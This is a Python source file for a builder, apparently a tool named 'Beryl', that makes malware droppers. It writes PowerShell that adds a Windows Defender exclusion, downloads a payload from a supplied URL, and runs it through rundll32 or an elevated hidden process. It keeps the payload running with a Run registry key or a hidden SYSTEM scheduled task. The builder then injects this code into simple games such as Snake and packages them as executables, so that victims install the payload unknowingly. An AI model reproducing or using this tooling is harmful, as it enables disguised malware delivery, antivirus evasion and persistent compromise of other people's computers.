import os
import random
import colorama
from colorama import Fore, Style
import argparse
import subprocess
import sys
import platform

def display_ansi_art(file_path):
    with open(file_path, 'r', encoding='latin-1') as file:
        ansi_art = file.read()
    print(ansi_art)

def create_exe(py_file, game_type,uac):

    try:
        icons_directory = "icons"
        icon_file = os.path.join(icons_directory, 'Beryl.ico')  # Default icon file path
        name ="Beryl"
        if game_type == "snake":
            icon_file = os.path.join(icons_directory, 'snake.ico')
            name = "Snake"
        elif game_type == "flapybird":
            icon_file = os.path.join(icons_directory, 'flapybird.ico')
            name = "FlapyBird"
        elif game_type == "racecar":
            icon_file = os.path.join(icons_directory, 'racecar.ico')
            name = "CarRace"
        elif game_type == "turtle":
            icon_file = os.path.join(icons_directory, 'turtle.ico')
            name = "Turtle"
        uac_option = "--uac-admin" if uac else "--nowindowed"


        pyinstaller_command = [
            "pyinstaller",
            "--onefile",
            "--icon", icon_file,
            "--name", name,
            "--noconsole",
            uac_option,
            "--distpath=Output",
            py_file
        ]

        subprocess.run(pyinstaller_command)
        print("Executable created successfully.")
    except Exception as e:
        print("An error occurred:", str(e))


def main():
    colorama.init(autoreset=True)  # Initialize colorama for Windows
    ans_directory = 'banners'
    spec= os.path.abspath(".")
    spec_files= [file for file in os.listdir(spec) if file.endswith('.spec')]
    ans_files = [file for file in os.listdir(ans_directory) if file.endswith('.ans')]
    if not ans_files:
        print("No .ans files found in the current directory.")
        return
    for file in spec_files:
        if file.endswith('.spec'):
            file_path = os.path.join(spec, file)
            os.remove(file_path)
            print(f"Deleted file: {file}")
    random_ans_file = os.path.join(ans_directory, random.choice(ans_files))
    display_ansi_art(random_ans_file)
    introduction = (
        Fore.GREEN + "Death Is Not The End, Death Is Just A Long Slumber\n"
        "Version: 1.2\n"
        "Author: ELMERIKH\n" + Style.RESET_ALL
    )
    print(introduction)
    game_types = ['Snake', 'FlapyBird', 'Turtle','RaceCar']

    parser = argparse.ArgumentParser(description="Generate PowerShell script with inputs")
    parser.add_argument("-d", "--directory_path", required=True, help="Directory path")
    parser.add_argument("-url", "--url", required=True, help="URL")
    parser.add_argument("-n", "--output_name", required=True, help="Name of output executable")
    parser.add_argument("-g", "--game_type", choices=game_types, required=False, help="Name of game to embed into. If not specified, no GUI executable will be generated")
    parser.add_argument("-dll", "--dll",  required=False, help="name of function to run with dll file")
    parser.add_argument("-uac",action="store_true", help="UAC,if not choosen attempts to escalate privilege")

    args = parser.parse_args()
    
    if args.dll:
        global pow
        home = os.path.expanduser("~")
        path=os.path.join(home,args.directory_path,args.output_name)
       
        path = path.replace("\\", "\\\\")
        fcn={args.dll}
        powershell_template = [
        "$directoryPath = Join-Path $HOME '{directory_path}'",
        "Add-MpPreference -ExclusionPath $directoryPath",
        "$url = '{url}'",
        "$targetDirectory = Join-Path $HOME '{target_directory}'",
        "if (-not (Test-Path -Path $targetDirectory)) {{New-Item -Path $targetDirectory -ItemType Directory -Force}}",
        "$outputFile = Join-Path $targetDirectory '{output_name}.dll'",
        "Invoke-WebRequest -Uri $url -OutFile $outputFile",
        "$installerPath = $outputFile",
        "start C:\\\\Windows\\\\System32\\\\rundll32.exe $outputFile, {dll}",
        f'reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v BERYL /t REG_SZ /d \\"C:\\\\Windows\\\\System32\\\\rundll32.exe {path}.dll, {fcn}\\" /f',
        
        
        
    ]
        
        pow=powershell_template
      
    else:
        home = os.path.expanduser("~")
        path=os.path.join(home,args.directory_path,args.output_name)
        path = path.replace("\\", "\\\\")

        powershell_template = [
        "$directoryPath = Join-Path $HOME '{directory_path}'",
        "Add-MpPreference -ExclusionPath $directoryPath",
        "$url = '{url}'",
        "$targetDirectory = Join-Path $HOME '{directory_path}'",
        "if (-not (Test-Path -Path $targetDirectory)) {{New-Item -Path $targetDirectory -ItemType Directory -Force}}",
        "$outputFile = Join-Path $targetDirectory '{output_name}.exe'",
        "$programName = '{output_name}'",
        "$programPath = $outputFile ",
        "Invoke-WebRequest -Uri $url -OutFile $outputFile",
        "$installerPath = $outputFile",
        "$taskName = 'User_Feed_ESRV'",
        "$taskPath = $programPath ",
        "schtasks /create /SC ONLOGON /TN $taskName /TR $taskPath /RU SYSTEM /RL HIGHEST /IT",
        "$taskFolder = '\\'",
        "$objService = New-Object -ComObject 'Schedule.Service'",
        "$objService.Connect()",
        "$objRootFolder = $objService.GetFolder($taskFolder)",
        "$objTask = $objRootFolder.GetTask($taskName)",
        "$objTaskDefinition = $objTask.Definition",
        "$objTaskDefinition.Settings.StopIfGoingOnBatteries = $false",
        "$objTaskDefinition.Settings.DisallowStartIfOnBatteries = $false",
        "$objTaskDefinition.Settings.Hidden = $true",
        "$objTaskDefinition.Settings.StartWhenAvailable = $true",
        "$objTaskDefinition.Settings.Priority = 1",
        "$objRootFolder.RegisterTaskDefinition($taskName, $objTaskDefinition, 6, $null, $null, 0, $null)",
        "Start-Process -FilePath $installerPath -PassThru -WindowStyle Hidden -Verb RunAs"
    ]   
        pow=powershell_template




    powershell_script = '\n'.join(pow)

# Argument parsing

   

# Display the available game types
    print("Available game types:")
    for game_type in game_types:
        print(game_type)

    # Fill in the template with provided inputs
    powershell_script = powershell_script.format(
    directory_path=args.directory_path,
    url=args.url,
    target_directory=args.directory_path,
    output_name=args.output_name,
    dll=args.dll
)
        # Get the path to the directory containing the bundled files
    powershell_script_list = powershell_script.split('\n')
    formatted_powershell_script = '\n    ' + ',\n    '.join(['"' + line + '"' for line in powershell_script_list]) + '\n'

# Get the path to the directory containing the bundled files
    if hasattr(sys, '_MEIPASS'):
        bundle_dir = sys._MEIPASS
    else:
        bundle_dir = os.path.abspath(".")

# Update paw.py with the formatted powershell_script content
    paw_path = os.path.join(bundle_dir, 'paw.py')
    with open(paw_path, 'r') as paw_file:
        paw_contents = paw_file.read()
    start_marker = 'powershell = ['
    end_marker = ']'
    start_index = paw_contents.index(start_marker) + len(start_marker)
    end_index = paw_contents.index(end_marker, start_index)

# Replace the old powershell section with the new formatted PowerShell script
    new_paw_contents = paw_contents[:start_index] + formatted_powershell_script + paw_contents[end_index:]

# Write the updated content back to paw.py
    with open(paw_path, 'w') as paw_file:
     paw_file.write(new_paw_contents)
    
    with open('paw.py', 'r') as paw_file:
        paw_contents = paw_file.read()

# Define the start and end markers for the desired section in 'paw.py'
    start_marker = "# Start of desired section"
    end_marker = "# End of desired section"

# Find the positions of the start and end markers in 'paw.py'
    start_index = paw_contents.find(start_marker)
    end_index = paw_contents.find(end_marker)

    if start_index != -1 and end_index != -1:
    
        desired_section = paw_contents[start_index:end_index]
    if args.game_type:
        game_directory = f"games\{args.game_type.lower()}"
    
        game_path = os.path.join(game_directory, f"{args.game_type.lower()}.py")
        print('\n')
    
        print(f"you have selected Game : {args.game_type.upper()}")
        print('\n')
   
        if os.path.exists(game_path):
            with open(game_path, 'r') as game_file:
                game_contents = game_file.read()

            insertion_point = game_contents.find('score = 0')

            # Split the game_contents into two parts
            before_insertion = game_contents[:insertion_point]
            after_insertion = game_contents[insertion_point:]

            # Combine the contents in the desired order
            combined_contents = before_insertion + '\n' + desired_section + '\n' + after_insertion
            
            # Write the combined contents into pew.py
            with open('pew.py', 'w') as pew_file:
                pew_file.write(combined_contents)
            print("Creating the executable...")
            create_exe('./pew.py', args.game_type.lower(),args.uac)
            print("Finished creating the executable  in Output folder.")    
    else:
        print('\n')
        print(f"no game file specified, generating no GUI exe")
        print('\n')
        with open('paw.py', 'r') as paw_file:
            paw_contents = paw_file.read()
        with open('pew.py', 'w') as pew_file:
            pew_file.write(paw_contents)    


    # Display message and create exe file
        print("Creating the executable...")
        print('\n')
        
        create_exe('./pew.py',"no gui",args.uac)
             
        print("Finished creating the executable in Output folder.")

if __name__ == "__main__":
    main()
